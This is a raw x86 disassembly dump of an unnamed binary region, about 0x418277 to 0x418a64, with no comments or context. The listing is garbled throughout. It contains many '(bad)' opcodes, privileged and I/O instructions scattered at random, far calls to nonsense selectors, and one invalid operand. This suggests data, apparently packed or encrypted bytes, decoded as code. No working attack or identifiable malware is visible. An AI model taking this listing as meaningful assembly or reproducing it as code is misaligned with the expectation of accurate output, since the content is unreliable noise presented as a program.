  418277:	xor    cl,BYTE PTR [edx+0x4d]
  41827a:	jl     0x418269
  41827c:	imul   esi,DWORD PTR [edx+ebx*8-0x2b],0x62
  418281:	add    DWORD PTR [ecx+ebp*1-0x64bf13b6],ebp
  418288:	loop   0x4182b8
  41828a:	pop    ebp
  41828b:	lahf   
  41828c:	pop    es
  41828d:	or     ecx,ebp
  41828f:	rol    BYTE PTR [edi+0x5b43ebd3],1
  418295:	call   0xda09:0x51e9c94c
  41829c:	ins    BYTE PTR es:[edi],dx
  41829d:	inc    esp
  41829f:	add    ebx,DWORD PTR [eax-0x73]
  4182a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182a3:	sub    esp,0x6ba9dc28
  4182a9:	and    bh,BYTE PTR [ebx+edi*4+0x45]
  4182ad:	mov    ah,0x4
  4182af:	int3   
  4182b0:	and    al,0xa1
  4182b2:	xchg   edx,ebp
  4182b4:	push   ds
  4182b5:	add    esp,esp
  4182b7:	inc    edx
  4182b8:	daa    
  4182b9:	mov    bl,0xbe
  4182bb:	xchg   edi,eax
  4182bc:	test   eax,0x293079ff
  4182c1:	ja     0x418317
  4182c3:	enter  0x898a,0xcf
  4182c7:	add    eax,0x933e1148
  4182cc:	into   
  4182cd:	imul   edi,edi,0x5ff0d276
  4182d3:	pop    ds
  4182d4:	sub    ebx,0x9
  4182d7:	out    dx,eax
  4182d8:	push   esp
  4182d9:	dec    ax
  4182db:	retf   
  4182dc:	(bad)  
  4182dd:	mov    dh,0x5e
  4182df:	xchg   esp,eax
  4182e0:	call   FWORD PTR [esi-0x4226b614]
  4182e6:	xor    eax,DWORD PTR [edx]
  4182e8:	jne    0x418326
  4182ea:	or     al,0xc4
  4182ec:	inc    edx
  4182ed:	out    0xbd,eax
  4182ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182f0:	or     BYTE PTR [ecx-0x4d],ah
  4182f3:	pushf  
  4182f4:	out    dx,eax
  4182f5:	int3   
  4182f6:	leave  
  4182f7:	ret    
  4182f8:	and    DWORD PTR [eax-0x2ecc1cc5],esi
  4182fe:	jg     0x4182da
  418300:	icebp  
  418301:	mov    bl,BYTE PTR [ecx-0x7154614a]
  418307:	xchg   DWORD PTR [esi],ecx
  418309:	add    ecx,0x40
  41830c:	loopne 0x41829c
  41830e:	arpl   WORD PTR ds:0x5cbd2486,ax
  418314:	pop    ebx
  418315:	adc    bh,0x25
  418318:	pop    edx
  418319:	gs je  0x418398
  41831c:	inc    edx
  41831d:	add    BYTE PTR [ecx-0xe],dh
  418320:	adc    ecx,DWORD PTR [ecx]
  418322:	outs   dx,BYTE PTR ds:[esi]
  418323:	js     0x4182ee
  418325:	inc    ebx
  418326:	repz inc eax
  418328:	das    
  418329:	and    eax,0x7e3ce748
  41832e:	into   
  41832f:	je     0x41831e
  418331:	add    eax,0xd9ca4ffb
  418336:	pushf  
  418337:	xchg   ebp,eax
  418338:	inc    eax
  418339:	icebp  
  41833a:	pop    esi
  41833b:	adc    esp,DWORD PTR [ebx]
  41833d:	mov    ah,dl
  41833f:	fld    DWORD PTR [eax+0x50]
  418342:	sub    BYTE PTR [ecx],ah
  418344:	les    esi,FWORD PTR [ebp-0x52a32ab6]
  41834a:	sbb    ecx,DWORD PTR [ebp+0x303e37a6]
  418350:	cld    
  418351:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  418353:	adc    esi,DWORD PTR [esi]
  418355:	test   al,0x72
  418357:	sbb    bl,ch
  418359:	mov    al,ds:0x63268f8
  41835e:	adc    al,0xdd
  418360:	(bad)  
  418361:	xchg   edx,eax
  418362:	iret   
  418363:	inc    edi
  418364:	cmp    DWORD PTR [esi+0x4d927455],0x27
  41836b:	mov    edi,0x52052ce1
  418370:	(bad)  
  418371:	mov    dh,0xfd
  418373:	sub    esi,esp
  418375:	aaa    
  418376:	mov    ebx,0xd7f7f309
  41837b:	cmp    edi,eax
  41837d:	jp     0x41833f
  41837f:	iret   
  418380:	leave  
  418381:	dec    esi
  418382:	push   ebx
  418383:	push   edx
  418384:	test   DWORD PTR [ebp+0x30b7f59e],esp
  41838a:	xor    ch,BYTE PTR [edi]
  41838c:	sbb    DWORD PTR [edi+0x23],esp
  41838f:	xchg   ebp,eax
  418390:	out    0x21,al
  418392:	or     DWORD PTR [esp+ecx*4],ecx
  418395:	enter  0x7c12,0x5e
  418399:	das    
  41839a:	pop    ebp
  41839b:	enter  0xfe23,0x32
  41839f:	bound  ecx,QWORD PTR [edi-0x6f435953]
  4183a5:	js     0x41841a
  4183a7:	dec    esp
  4183a8:	out    0xd0,eax
  4183aa:	loop   0x4183cb
  4183ac:	or     al,0xc9
  4183ae:	sub    ah,BYTE PTR [edi]
  4183b0:	fs js  0x4183c1
  4183b3:	dec    ebp
  4183b4:	inc    esp
  4183b5:	stos   DWORD PTR es:[edi],eax
  4183b6:	adc    eax,esi
  4183b8:	xchg   DWORD PTR [eax],esi
  4183ba:	(bad)  
  4183bb:	aam    0xcb
  4183bd:	sbb    esi,DWORD PTR [ecx]
  4183bf:	add    ebp,esp
  4183c1:	pop    es
  4183c2:	xchg   ebp,eax
  4183c3:	rcl    DWORD PTR [ebp+0x74396373],0x10
  4183ca:	loopne 0x4183ac
  4183cc:	aam    0xee
  4183ce:	sub    DWORD PTR [ebx],edi
  4183d0:	add    BYTE PTR [eax],0x3c
  4183d3:	int3   
  4183d4:	scas   al,BYTE PTR es:[edi]
  4183d5:	stos   BYTE PTR es:[edi],al
  4183d6:	push   0xb
  4183d8:	pop    ebp
  4183d9:	test   BYTE PTR [eax],0x50
  4183dc:	retf   0xafa6
  4183df:	scas   eax,DWORD PTR es:[edi]
  4183e0:	and    DWORD PTR ss:[eax+0x69],ebp
  4183e4:	and    edi,esi
  4183e6:	cli    
  4183e7:	cmp    al,bl
  4183e9:	add    al,0x54
  4183eb:	push   ds
  4183ec:	dec    edx
  4183ed:	stos   BYTE PTR es:[edi],al
  4183ee:	cli    
  4183ef:	test   eax,0xb9a8a358
  4183f4:	inc    ecx
  4183f5:	xor    dh,BYTE PTR [esi]
  4183f7:	mov    ebp,0x57861e8c
  4183fc:	inc    esp
  4183fd:	mov    edi,esp
  4183ff:	stos   BYTE PTR es:[edi],al
  418400:	cs or  eax,0xcd65abb0
  418406:	mov    bh,0x79
  418408:	jo     0x4183d1
  41840a:	push   edx
  41840b:	shr    BYTE PTR [edx],0x38
  41840e:	les    ebx,FWORD PTR [eax-0x4aa27b8c]
  418414:	jno    0x418461
  418416:	xor    DWORD PTR [eax+eiz*4-0x7d1f120a],edx
  41841d:	call   0x5c62:0x88f6ba8b
  418424:	(bad)  
  418425:	scas   al,BYTE PTR es:[edi]
  418426:	dec    ecx
  418427:	push   ds
  418428:	push   edi
  418429:	test   edx,esp
  41842b:	pop    esp
  41842c:	rol    esp,cl
  41842e:	pop    ecx
  41842f:	xchg   edx,eax
  418430:	outs   dx,BYTE PTR ds:[esi]
  418431:	es jecxz 0x4183db
  418434:	pop    esp
  418435:	hlt    
  418436:	inc    eax
  418437:	imul   esi,DWORD PTR [eax-0x2e],0xb5de06e7
  41843e:	xor    DWORD PTR [edi-0x5c],esi
  418441:	jno    0x41844f
  418443:	repz iret 
  418445:	ficom  DWORD PTR [ebx-0x54f68610]
  41844b:	jmp    0x53d513
  418450:	pushf  
  418451:	je     0x4184a0
  418453:	(bad)  
  418455:	in     al,dx
  418456:	lea    eax,[esi]
  418458:	mov    edx,edx
  41845a:	mov    ebx,0xa71aeaa6
  41845f:	inc    ebx
  418460:	stc    
  418461:	xchg   esi,eax
  418462:	les    esi,FWORD PTR ds:0x792d414c
  418468:	mov    edi,0x9785dd63
  41846d:	pop    ebp
  41846e:	and    ch,BYTE PTR [ebp+0x2c]
  418471:	inc    eax
  418473:	add    BYTE PTR [ecx],cl
  418475:	cld    
  418476:	xchg   edi,eax
  418477:	dec    esi
  418478:	dec    edi
  418479:	sbb    dh,BYTE PTR [edi+0x2602634a]
  41847f:	xchg   ebp,eax
  418480:	(bad)  es:[edi-0x28]
  418484:	loop   0x418443
  418486:	cmp    eax,DWORD PTR [esi]
  418488:	lea    ebp,[ecx-0xd0792de]
  41848e:	or     edx,DWORD PTR [esi]
  418490:	mul    DWORD PTR [eax-0x6baa4b8]
  418496:	mov    dl,BYTE PTR [esi+0x1b5a4d08]
  41849c:	mov    dl,BYTE PTR [esi]
  41849e:	pop    ebp
  41849f:	adc    BYTE PTR [edx+0x5d],0x1f
  4184a3:	pop    edx
  4184a4:	loopne 0x4184e3
  4184a6:	ror    BYTE PTR [ebx-0x7aa8aec8],cl
  4184ac:	es push bx
  4184af:	mov    ds:0xa64a8c16,al
  4184b4:	das    
  4184b5:	inc    esp
  4184b6:	arpl   WORD PTR [edi],dx
  4184b8:	sub    al,BYTE PTR [ebp-0x76]
  4184bb:	xchg   edi,eax
  4184bc:	sub    BYTE PTR [edx-0x4712e09d],0x81
  4184c3:	pop    esi
  4184c4:	jbe    0x41846b
  4184c6:	mov    ?,WORD PTR [ebx+esi*1]
  4184c9:	shl    DWORD PTR [ebx+0x5f],cl
  4184cc:	push   ecx
  4184cd:	inc    ebp
  4184ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184cf:	retf   
  4184d0:	cld    
  4184d1:	fnsave [eax-0x132e99ab]
  4184d7:	cmp    eax,0x9abb070e
  4184dc:	xor    eax,0x4d1120f0
  4184e1:	fdivr  st,st(3)
  4184e3:	mov    DWORD PTR [ebx-0x3c],eax
  4184e6:	and    BYTE PTR [edi+0x4a7fc92a],bh
  4184ec:	ja     0x4184ef
  4184ee:	sbb    eax,0x5cd7237c
  4184f3:	adc    bh,dl
  4184f5:	repnz inc ebx
  4184f7:	cmp    dl,bh
  4184f9:	or     BYTE PTR [ebx+0x617909f7],0x47
  418500:	(bad)  
  418502:	mov    cl,0xb6
  418504:	mov    BYTE PTR ds:0xe096858b,bl
  41850a:	out    0xbc,al
  41850c:	sub    DWORD PTR [ecx-0x20efeef1],ebp
  418512:	test   al,0xa6
  418514:	enter  0x1f3c,0x32
  418518:	mov    al,ds:0xaaf2a339
  41851d:	stc    
  41851e:	xor    edi,DWORD PTR [ecx]
  418520:	mul    DWORD PTR [esi+ecx*8-0x11]
  418524:	xor    BYTE PTR [esi],ah
  418526:	lods   al,BYTE PTR ds:[esi]
  418527:	inc    eax
  418528:	sar    BYTE PTR [edi+0xe],0x3e
  41852c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41852d:	dec    eax
  41852e:	jp     0x418544
  418530:	push   ds
  418531:	dec    ebp
  418532:	shl    BYTE PTR [ecx+0x481c244f],0x37
  418539:	jb     0x418558
  41853b:	data16 out dx,al
  41853d:	aaa    
  41853e:	out    0x4,al
  418540:	cmp    eax,0x99cd9429
  418545:	fisttp WORD PTR [ebp+0x23]
  418548:	mov    DWORD PTR [edx-0x27],ecx
  41854b:	fldcw  WORD PTR [ebp+0x68ebe561]
  418551:	pop    ebp
  418552:	fsub   QWORD PTR [eax+edi*8+0x6fd6af05]
  418559:	fnstenv ds:0x4c820f60
  41855f:	scas   al,BYTE PTR es:[edi]
  418560:	or     al,al
  418562:	cmp    esp,DWORD PTR [edx+0x72]
  418565:	or     BYTE PTR [esi+0x1962494c],dh
  41856b:	(bad)
  41856e:	adc    eax,0xacd243e3
  418573:	add    DWORD PTR [ecx-0x54],esi
  418576:	cwde   
  418577:	(bad)  
  418578:	push   ds
  418579:	push   ds
  41857a:	lds    edi,FWORD PTR [esp+edx*4+0x1df2f063]
  418581:	push   esp
  418582:	out    0x13,al
  418584:	cmp    edx,edx
  418586:	cld    
  418587:	sbb    BYTE PTR [eax],ch
  418589:	fiadd  DWORD PTR [eax-0x6c]
  41858c:	inc    edi
  41858d:	inc    ecx
  41858e:	mov    al,ds:0xec8f48fa
  418593:	xor    eax,0xe951072b
  418598:	xor    al,0xb5
  41859a:	mov    ebx,0x85702d11
  41859f:	jle    0x41858a
  4185a1:	add    bh,BYTE PTR ds:0xc834ff63
  4185a7:	aas    
  4185a8:	pop    ss
  4185a9:	lea    ebx,ds:0x2533be87
  4185af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185b0:	push   edi
  4185b1:	ds adc al,0x6b
  4185b4:	mov    dh,0x7a
  4185b6:	ss lock (bad) 
  4185b9:	in     al,0x2
  4185bb:	jo     0x4185f5
  4185bd:	dec    eax
  4185be:	push   eax
  4185bf:	sbb    DWORD PTR [edx+0x616760a4],edx
  4185c5:	inc    eax
  4185c6:	aaa    
  4185c7:	inc    esi
  4185c8:	pusha  
  4185c9:	jl     0x41855a
  4185cb:	repnz inc ebp
  4185cd:	lock dec esi
  4185cf:	aad    0xd6
  4185d1:	mov    bh,bh
  4185d3:	xor    esi,DWORD PTR [ebx-0x6d]
  4185d6:	xor    edx,ebp
  4185d8:	push   ebp
  4185d9:	(bad)  [ecx+0x44e77a8e]
  4185df:	fs rcr bl,cl
  4185e2:	adc    esi,ecx
  4185e4:	popa   
  4185e5:	(bad)  
  4185e6:	aam    0xf8
  4185e8:	push   ss
  4185e9:	mov    eax,ds:0x271b16bf
  4185ee:	sbb    eax,DWORD PTR [esi]
  4185f0:	mov    edi,0x5f699ee
  4185f5:	sar    DWORD PTR [esi+esi*1-0x2],0xc4
  4185fa:	dec    edi
  4185fb:	add    dl,bh
  4185fd:	clts   
  4185ff:	push   ebx
  418600:	adc    eax,0x18eeaf5a
  418605:	or     ah,bh
  418607:	icebp  
  418608:	ins    BYTE PTR es:[edi],dx
  418609:	test   DWORD PTR [edi-0x1b],esp
  41860c:	pop    esi
  41860d:	imul   ecx,DWORD PTR [esi+0x54],0xfffffff6
  418611:	push   esp
  418612:	dec    esp
  418613:	leave  
  418614:	add    al,0x5d
  418616:	sub    bl,ah
  418618:	jne    0x4185e8
  41861a:	pusha  
  41861b:	adc    eax,0x25cfca6d
  418620:	and    ebx,DWORD PTR [edx+0x35]
  418623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418624:	push   0x5323bf6d
  418629:	into   
  41862a:	mov    al,ds:0x26bb0c6d
  41862f:	jge    0x41862b
  418631:	or     esp,DWORD PTR [edx]
  418633:	sbb    al,0xe5
  418635:	in     al,0x14
  418637:	loope  0x4185d0
  418639:	jb     0x418672
  41863b:	cwde   
  41863c:	call   0x9f4f:0x715a39
  418643:	out    0x90,eax
  418645:	sub    al,0x41
  418647:	btc    DWORD PTR [eax-0x50],ebp
  41864b:	or     al,0x8d
  41864d:	call   0x210d:0xbf52074d
  418654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418655:	call   DWORD PTR [ecx-0x1b95c52b]
  41865b:	and    esp,esp
  41865d:	ins    BYTE PTR es:[edi],dx
  41865e:	mov    ds:0x4de4deaa,al
  418663:	clc    
  418664:	rcr    BYTE PTR [ebx],0x4
  418667:	lock sar DWORD PTR [edx*1+0x36489357],0x78
  418670:	or     dh,bh
  418672:	push   esp
  418673:	pop    ebp
  418674:	arpl   WORD PTR [ecx],si
  418676:	aaa    
  418677:	or     DWORD PTR [ebx-0x1d7cfe6a],ebp
  41867d:	mov    DWORD PTR [ebp+0x52afcd52],ebp
  418683:	push   0xffffffe6
  418685:	mov    cl,0x83
  418687:	add    edi,DWORD PTR [ecx+0x491affa6]
  41868d:	stos   BYTE PTR es:[edi],al
  41868e:	mov    edi,0x59bc323d
  418693:	add    BYTE PTR [ebp+0x1b2650c4],dl
  418699:	push   ecx
  41869a:	and    al,0x4b
  41869c:	lods   eax,DWORD PTR ds:[esi]
  41869d:	jmp    0xb4267a84
  4186a2:	xchg   edi,eax
  4186a3:	sub    al,0x4a
  4186a5:	mov    bl,BYTE PTR [ebx]
  4186a7:	or     dl,BYTE PTR [ecx+edi*2-0x13b0b5d9]
  4186ae:	ss jg  0x4186b5
  4186b1:	dec    edx
  4186b2:	shl    DWORD PTR [ecx-0x68],0x72
  4186b6:	dec    edx
  4186b7:	mul    BYTE PTR [edx]
  4186b9:	jb     0x418698
  4186bb:	push   esp
  4186bc:	add    al,ah
  4186be:	pop    ds
  4186bf:	sbb    BYTE PTR [ebp-0x70621cdc],dh
  4186c5:	cs mov ch,0xfc
  4186c8:	scas   al,BYTE PTR es:[edi]
  4186c9:	inc    esi
  4186ca:	cwde   
  4186cb:	data16 rol BYTE PTR [ebp-0x38],0x2b
  4186d0:	dec    ebx
  4186d1:	xchg   ecx,eax
  4186d2:	shl    DWORD PTR [esi-0x7e],0x95
  4186d6:	pop    ebp
  4186d7:	into   
  4186d8:	sbb    BYTE PTR [eax+0x7e],0x75
  4186dc:	pusha  
  4186dd:	mov    dh,0x93
  4186df:	fmul   DWORD PTR [ecx-0x18]
  4186e2:	sub    DWORD PTR [edx],0xd490bd85
  4186e8:	jno    0x4186ac
  4186ea:	out    dx,eax
  4186eb:	(bad)  
  4186ec:	jmp    0x4186e8
  4186ee:	sbb    ecx,DWORD PTR [edx+0x2e]
  4186f1:	stos   DWORD PTR es:[edi],eax
  4186f2:	sbb    ebp,DWORD PTR [ecx+0x45]
  4186f5:	(bad)  
  4186f6:	xchg   esp,eax
  4186f7:	repz (bad) 
  4186f9:	repnz inc ebp
  4186fb:	inc    ch
  4186fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186fe:	or     esi,DWORD PTR [ebp+0x43]
  418701:	cmc    
  418702:	dec    edx
  418703:	dec    esp
  418704:	xchg   esp,eax
  418705:	dec    ecx
  418706:	or     bl,dl
  418708:	fldenv [edi-0x6a59e7da]
  41870e:	jl     0x41869f
  418710:	jmp    DWORD PTR [edx]
  418712:	lock add esi,DWORD PTR [edx-0x51ca6a10]
  418719:	mov    dl,0xad
  41871b:	gs mov ecx,0x26f63a22
  418721:	repz jecxz 0x41879f
  418724:	outs   dx,BYTE PTR ds:[esi]
  418725:	xchg   esi,eax
  418726:	cmp    bh,bl
  418728:	jns    0x418759
  41872a:	adc    ebx,DWORD PTR [ebp-0x6b]
  41872d:	daa    
  41872e:	jo     0x418746
  418730:	xor    DWORD PTR [edx+0x65],ecx
  418733:	cmp    eax,0xde4ce812
  418738:	mov    ebp,0x5837b148
  41873d:	pop    ebp
  41873e:	in     al,dx
  41873f:	sbb    eax,0x9113cee1
  418744:	mov    bl,0x3c
  418746:	dec    esi
  418747:	in     eax,0x8b
  418749:	imul   eax,esp,0xf8111d1a
  41874f:	pop    eax
  418750:	hlt    
  418751:	repnz adc BYTE PTR [eax+0x2e0ac4c0],bh
  418758:	mov    eax,0xc4ae8b6
  41875d:	ins    DWORD PTR es:[edi],dx
  41875e:	fnstenv [edx+0x62d91b5c]
  418764:	aaa    
  418765:	mov    edx,0xcda57a81
  41876a:	adc    al,BYTE PTR [edx+ebp*2-0x2332f53]
  418771:	(bad)  
  418772:	ds dec edi
  418774:	sbb    al,0xcf
  418776:	pop    ds
  418777:	ss dec ecx
  418779:	cmc    
  41877a:	or     edi,ecx
  41877c:	xor    DWORD PTR [ebx+ebx*1+0x5d],0x71
  418781:	jl     0x4187ea
  418783:	test   BYTE PTR [eax],ch
  418785:	add    DWORD PTR [esi],ebp
  418787:	outs   dx,DWORD PTR ds:[esi]
  418788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418789:	dec    eax
  41878a:	loopne 0x418723
  41878c:	jmp    0x41874d
  41878e:	leave  
  41878f:	(bad)  
  418790:	xor    edi,DWORD PTR [ecx+ecx*2]
  418793:	cmp    DWORD PTR [edi-0x49],eax
  418796:	test   BYTE PTR [edx-0x37ab3fad],al
  41879c:	mov    ds:0x71547493,al
  4187a1:	and    al,0x4a
  4187a3:	aam    0xd5
  4187a5:	pop    esp
  4187a6:	lods   al,BYTE PTR ds:[esi]
  4187a7:	cmc    
  4187a8:	clc    
  4187a9:	push   0x4a
  4187ab:	xor    eax,edx
  4187ad:	jge    0x4187a6
  4187af:	pop    eax
  4187b1:	lods   eax,DWORD PTR ds:[esi]
  4187b2:	push   ebx
  4187b3:	ss (bad) 
  4187b5:	shr    bh,0x30
  4187b8:	(bad)
  4187bb:	xor    al,0xae
  4187bd:	int3   
  4187be:	mov    edi,0x271fa69d
  4187c3:	hlt    
  4187c4:	sub    al,0xdf
  4187c6:	jae    0x41877b
  4187c8:	xor    BYTE PTR [ebp+0x3a],dh
  4187cb:	cdq    
  4187cc:	les    edx,FWORD PTR [ebp-0xe]
  4187cf:	fdivr  DWORD PTR [ecx-0x8af6b43]
  4187d5:	fcomp  DWORD PTR [eax+edx*1]
  4187d8:	mov    BYTE PTR [ecx+eiz*1],bh
  4187db:	push   ebp
  4187dc:	push   cs
  4187dd:	xor    DWORD PTR [edi-0x7f52009c],edi
  4187e3:	mov    bh,0x18
  4187e5:	or     ebx,DWORD PTR [eax+0x13]
  4187e8:	cs xchg esi,eax
  4187ea:	mov    ebx,0xaa6d1497
  4187ef:	clc    
  4187f0:	mov    ebp,0xaf782f03
  4187f5:	or     DWORD PTR [edi+ebx*8],ebp
  4187f8:	sub    edx,ebx
  4187fa:	sub    ebx,ebx
  4187fc:	sub    esi,DWORD PTR [edi-0x5771074]
  418802:	pop    esp
  418803:	mov    DWORD PTR [edi],esp
  418805:	into   
  418806:	inc    eax
  418807:	popf   
  418808:	je     0x418855
  41880a:	nop
  41880b:	mov    cl,0x9b
  41880d:	mov    eax,ds:0xd89d193c
  418812:	pop    ds
  418813:	mov    cl,BYTE PTR [edx+0x24a3e884]
  418819:	test   DWORD PTR [ebp+0x1],0x1fe7c2c2
  418820:	fcomp  QWORD PTR [ebx+0x8697ced]
  418826:	xor    dh,BYTE PTR [esi+0x687c3b84]
  41882c:	sub    cl,ah
  41882e:	add    BYTE PTR [ebx+0x39],bl
  418831:	cli    
  418832:	add    ecx,esi
  418834:	and    DWORD PTR [ecx],esp
  418836:	xor    BYTE PTR [esi+edi*1+0x2a],bh
  41883a:	arpl   di,bx
  41883c:	push   ebp
  41883d:	cli    
  41883e:	mov    esp,0x8496a97
  418843:	jb     0x418880
  418845:	idiv   ebp
  418847:	mov    ebx,0xbdcfedf7
  41884c:	sbb    cl,BYTE PTR [edi-0x13]
  41884f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418850:	fimul  DWORD PTR [edx+0x19ea5f1]
  418856:	data16 mov cl,0x5
  418859:	sahf   
  41885a:	jmp    0x6219:0x630a9e09
  418861:	xor    DWORD PTR [edx-0x51ead850],esp
  418867:	outs   dx,BYTE PTR ds:[esi]
  418868:	rcr    BYTE PTR [eax+0x5],1
  41886b:	sub    bh,bh
  41886d:	or     eax,0xfaf29fa4
  418872:	in     eax,dx
  418873:	mov    esi,0x341dd0ff
  418878:	mov    edx,0x4ac63a0b
  41887d:	jae    0x4188da
  41887f:	les    ebp,FWORD PTR [edi+eax*4-0x1d]
  418883:	adc    dh,bl
  418885:	or     esi,DWORD PTR [edi+0x31c48034]
  41888b:	mov    fs:0x87c4580d,al
  418891:	xor    edx,DWORD PTR [esi-0x51]
  418894:	pop    ecx
  418895:	inc    edi
  418896:	cmp    edi,edx
  418898:	mov    ebp,0x4c51ac7e
  41889d:	pop    ecx
  41889e:	sub    bh,BYTE PTR [edx+0x191e9d65]
  4188a4:	jecxz  0x418854
  4188a6:	in     eax,dx
  4188a7:	ss adc bh,bl
  4188aa:	fcmovne st,st(3)
  4188ac:	sub    BYTE PTR [ecx],0xdb
  4188af:	test   al,0x8c
  4188b1:	cmp    ah,BYTE PTR [ebx+0x3c]
  4188b4:	mov    BYTE PTR [ebx-0x3113da8e],0x1a
  4188bb:	jl     0x41892b
  4188bd:	stos   DWORD PTR es:[edi],eax
  4188be:	or     BYTE PTR [esi],0x5c
  4188c1:	cmc    
  4188c2:	test   BYTE PTR [ecx+0xa],ah
  4188c5:	or     bl,BYTE PTR [edi-0x43711ad1]
  4188cb:	dec    edi
  4188cc:	call   0x1fe6:0x40ca5498
  4188d3:	call   0x41632c79
  4188d8:	fsub   DWORD PTR [edx+0x454e4cda]
  4188de:	mov    edx,0xf0339df
  4188e3:	ja     0x4188af
  4188e5:	inc    esi
  4188e6:	dec    ecx
  4188e7:	pop    ss
  4188e8:	jmp    0x4188d4
  4188ea:	dec    eax
  4188eb:	mov    edx,0x21741730
  4188f0:	sahf   
  4188f1:	cld    
  4188f2:	scas   eax,DWORD PTR es:[edi]
  4188f3:	add    DWORD PTR [esi],eax
  4188f5:	xchg   ecx,eax
  4188f6:	mov    ah,0x9f
  4188f8:	xor    eax,0x138cedc6
  4188fd:	ins    BYTE PTR es:[edi],dx
  4188fe:	shl    DWORD PTR [ecx-0x4a],0xad
  418902:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418904:	jnp    0x418931
  418906:	aam    0xbc
  418908:	cs mov ebp,0x8bad9d2b
  41890e:	and    ebp,DWORD PTR [ecx]
  418910:	hlt    
  418911:	retf   0x14f8
  418914:	int    0xff
  418916:	icebp  
  418917:	int    0xc0
  418919:	imul   ebx,DWORD PTR [esi],0x25
  41891c:	add    DWORD PTR [esi],edx
  41891e:	and    bh,BYTE PTR [esi+0x15]
  418921:	jae    0x41897c
  418923:	fwait
  418924:	lds    esi,FWORD PTR [edx+0x70531f36]
  41892a:	mov    ah,0xaf
  41892c:	dec    ecx
  41892d:	xchg   edx,eax
  41892e:	clc    
  41892f:	xor    eax,0x40896638
  418934:	call   0xccfe:0x5732e95e
  41893b:	add    bh,BYTE PTR [ecx+0x44]
  41893e:	inc    eax
  41893f:	cmc    
  418940:	cmp    ebp,DWORD PTR es:[eax*4-0x7a98e244]
  418948:	mov    ecx,0x66679e63
  41894d:	mov    ds:0xd45b9fa0,eax
  418952:	pop    ecx
  418953:	call   0xaaa040ed
  418958:	inc    esi
  418959:	data16 and cl,dl
  41895c:	shr    BYTE PTR ds:0x1e47fac,cl
  418962:	in     al,dx
  418963:	xchg   DWORD PTR [esi+ebx*4-0xa34f779],eax
  41896a:	mov    ds:0xa09096aa,al
  41896f:	xor    eax,ebp
  418971:	xor    eax,0x24956266
  418976:	scas   al,BYTE PTR es:[edi]
  418977:	mov    edi,0xefb686d4
  41897c:	or     dh,BYTE PTR [eax]
  41897e:	and    BYTE PTR [edi+edi*4],dh
  418981:	cli    
  418982:	adc    BYTE PTR [esi-0x39],al
  418985:	and    al,BYTE PTR [ebp-0x7d4eac5c]
  41898b:	push   0xffffff8a
  41898d:	ja     0x4189bf
  41898f:	ror    DWORD PTR [edi-0x1f],0xc9
  418993:	ror    DWORD PTR [edx-0x78],cl
  418996:	dec    ebp
  418997:	xchg   edi,eax
  418998:	add    BYTE PTR [ebx+0x744b6ec6],bl
  41899e:	or     cl,BYTE PTR [ebp-0x24a3275c]
  4189a4:	or     esi,DWORD PTR [ecx+0x3c4a39e3]
  4189aa:	fst    st(7)
  4189ac:	mov    al,0x92
  4189ae:	mov    dl,ah
  4189b0:	pop    ebp
  4189b1:	xchg   DWORD PTR [eax-0x76beed25],esi
  4189b7:	mov    WORD PTR [esi-0x24],gs
  4189ba:	push   es
  4189bb:	lock clc 
  4189bd:	outs   dx,BYTE PTR ds:[esi]
  4189be:	stos   DWORD PTR es:[edi],eax
  4189bf:	or     BYTE PTR [ebx+ebp*4+0x5870da3d],bh
  4189c6:	iret   
  4189c7:	rcr    DWORD PTR [ebx+0x40c37f76],1
  4189cd:	xchg   ebp,eax
  4189ce:	mov    ch,0x13
  4189d0:	add    dl,BYTE PTR [edx-0x76e0e389]
  4189d6:	daa    
  4189d7:	lds    esp,FWORD PTR [ebx-0x52]
  4189da:	aas    
  4189db:	fdiv   DWORD PTR ds:0xf2c1e94
  4189e1:	jo     0x41898f
  4189e3:	or     bl,bh
  4189e5:	adc    al,0x40
  4189e7:	cmp    eax,DWORD PTR [esi]
  4189e9:	mov    DWORD PTR [ebx+0x55178648],ecx
  4189ef:	les    edx,FWORD PTR [edx-0x6842ad84]
  4189f5:	cli    
  4189f6:	je     0x418a01
  4189f8:	fwait
  4189f9:	lods   eax,DWORD PTR ds:[esi]
  4189fa:	retf   
  4189fb:	sub    DWORD PTR [ebp+0x2f],ecx
  4189fe:	mov    ds:0x27d8bb6,al
  418a03:	push   ds
  418a04:	arpl   WORD PTR [edx+0x50],cx
  418a07:	aad    0xf3
  418a09:	xor    BYTE PTR [edi],bh
  418a0b:	ret    
  418a0c:	cld    
  418a0d:	mov    ebx,0xa78c6531
  418a12:	jb     0x418a5d
  418a14:	addr16 loopne 0x418a02
  418a17:	jnp    0x418a65
  418a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a1a:	daa    
  418a1b:	int    0xd5
  418a1d:	arpl   di,dx
  418a1f:	jo     0x418a57
  418a21:	push   edi
  418a22:	adc    eax,0x31837bc5
  418a27:	test   eax,0xbd646a15
  418a2c:	xor    ecx,esp
  418a2e:	jb     0x418a46
  418a30:	std    
  418a31:	stc    
  418a32:	fwait
  418a33:	and    dh,cl
  418a35:	aam    0x60
  418a37:	pop    ds
  418a38:	mov    ebp,0x24ea773b
  418a3d:	and    al,BYTE PTR [ecx-0x1d]
  418a40:	cmp    al,0x51
  418a42:	dec    ebp
  418a43:	retf   
  418a44:	scas   al,BYTE PTR es:[edi]
  418a45:	stc    
  418a46:	fcom   QWORD PTR [eax]
  418a48:	sbb    ecx,DWORD PTR [eax]
  418a4a:	pop    esp
  418a4b:	xchg   edx,eax
  418a4c:	ret    0x76d6
  418a4f:	out    dx,al
  418a50:	(bad)  [eax-0x5c3d15b]
  418a56:	and    al,0xf9
  418a58:	xchg   edi,eax
  418a59:	rcl    BYTE PTR [esi-0x2c540fb5],0x7c
  418a60:	push   0xffffffbf
  418a62:	loop   0x418a4d
  418a64:	fiadd  DWORD PTR [ebx+esi*8]
